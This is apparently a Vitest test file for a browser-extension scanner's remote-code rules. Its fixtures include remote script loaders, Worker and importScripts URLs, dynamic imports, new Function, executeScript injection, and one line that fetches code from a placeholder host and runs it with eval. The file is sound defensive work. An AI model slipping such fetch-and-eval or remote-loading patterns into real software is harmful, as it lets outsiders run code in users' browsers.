import { describe, expect, it } from 'vitest'
import { runRemoteCodeRules } from './remoteCodeRules'
import type { ScannerContext, VirtualFile } from '../core/types'

function vf(path: string, text: string): VirtualFile {
  const extension = path.slice(path.lastIndexOf('.'))
  return { path, normalizedPath: path, size: text.length, extension, isText: true, text }
}

function ctx(files: VirtualFile[]): ScannerContext {
  return {
    zipName: 'fixture.zip',
    manifestAtRoot: true,
    rootPrefix: '',
    files: new Map(files.map((file) => [file.normalizedPath, file])),
    allFiles: files,
    textFiles: files,
    jsFiles: files.filter((file) => ['.js', '.mjs', '.cjs'].includes(file.extension)),
    htmlFiles: files.filter((file) => ['.html', '.htm'].includes(file.extension)),
    scanLimits: [],
  }
}

describe('runRemoteCodeRules', () => {
  it('flags remote script tags as CWS001', () => {
    const findings = runRemoteCodeRules(ctx([vf('popup.html', '<script src="https://example.com/app.js"></script>')]))
    expect(findings.some((finding) => finding.ruleId === 'CWS001')).toBe(true)
  })

  it('flags standalone remote JavaScript URLs for manual review instead of dropping them', () => {
    const findings = runRemoteCodeRules(ctx([vf('content.js', 'const maybeLoader = "https://cdn.example.com/app.js"')]))
    expect(findings.some((finding) => finding.ruleId === 'CWS010' && finding.severity === 'medium')).toBe(true)
  })


  it('flags protocol-relative remote script tags as CWS001', () => {
    const findings = runRemoteCodeRules(ctx([vf('popup.html', '<script src="//cdn.example.com/app.js"></script>')]))
    expect(findings.some((finding) => finding.ruleId === 'CWS001')).toBe(true)
  })

  it('flags remote Worker scripts as CWS001', () => {
    const findings = runRemoteCodeRules(ctx([vf('content.js', 'const worker = new Worker("https://cdn.example.com/worker.js")')]))
    expect(findings.some((finding) => finding.ruleId === 'CWS001' && finding.title.includes('Worker'))).toBe(true)
  })

  it('flags importScripts from remote URLs as CWS001', () => {
    const findings = runRemoteCodeRules(ctx([vf('background.js', 'importScripts("https://example.com/worker.js")')]))
    expect(findings.some((finding) => finding.ruleId === 'CWS001')).toBe(true)
  })

  it('flags remote JavaScript URL assignment as CWS001', () => {
    const findings = runRemoteCodeRules(ctx([vf('content.js', 'script.src = "https://example.com/widget.js"')]))
    expect(findings.some((finding) => finding.ruleId === 'CWS001')).toBe(true)
  })

  it('flags extensionless dynamic remote imports as CWS001', () => {
    const findings = runRemoteCodeRules(ctx([vf('content.js', 'import("https://cdn.example.com/module")')]))
    expect(findings.some((finding) => finding.ruleId === 'CWS001' && finding.title.includes('Dynamic remote module'))).toBe(true)
  })

  it('flags remote URL variables passed into Worker loaders as CWS001', () => {
    const findings = runRemoteCodeRules(ctx([vf('content.js', 'const cdn = "https://cdn.example.com/modules"; const worker = new Worker(cdn + "/worker")')]))
    expect(findings.some((finding) => finding.ruleId === 'CWS001' && finding.title.includes('Worker'))).toBe(true)
  })

  it('flags fetch(remote) payloads executed with eval as CWS001', () => {
    const findings = runRemoteCodeRules(ctx([vf('background.js', 'const code = await fetch("https://cdn.example.com/remote-command").then(r => r.text()); eval(code)')]))
    expect(findings.some((finding) => finding.ruleId === 'CWS001' && finding.title.includes('Remote fetched payload'))).toBe(true)
  })

  it('does not flag local dynamic script creation by itself as CWS001', () => {
    const findings = runRemoteCodeRules(ctx([vf('content.js', 'const script = document.createElement("script"); script.src = "local.js"')]))
    expect(findings.some((finding) => finding.ruleId === 'CWS001')).toBe(false)
  })

  it('flags dynamic execution as CWS002', () => {
    const findings = runRemoteCodeRules(ctx([vf('content.js', 'new Function("return 1")')]))
    expect(findings.some((finding) => finding.ruleId === 'CWS002')).toBe(true)
  })

  it('flags legacy tabs.executeScript code injection as CWS002', () => {
    const findings = runRemoteCodeRules(ctx([vf('background.js', 'chrome.tabs.executeScript(tabId, { code: "alert(1)" })')]))
    expect(findings.some((finding) => finding.ruleId === 'CWS002' && finding.title.includes('executeScript'))).toBe(true)
  })

  it('adds confidence notes for possible non-runtime fixture files', () => {
    const findings = runRemoteCodeRules(ctx([vf('fixtures/example.js', 'const worker = new Worker("https://cdn.example.com/worker.js")')]))
    expect(findings.some((finding) => finding.confidence?.includes('possible non-runtime context'))).toBe(true)
  })


  it('does not treat manifest host permissions as CWS010', () => {
    const findings = runRemoteCodeRules(ctx([vf('manifest.json', '{"host_permissions":["https://example.com/*"]}')]))
    expect(findings.some((finding) => finding.ruleId === 'CWS010')).toBe(false)
  })
})
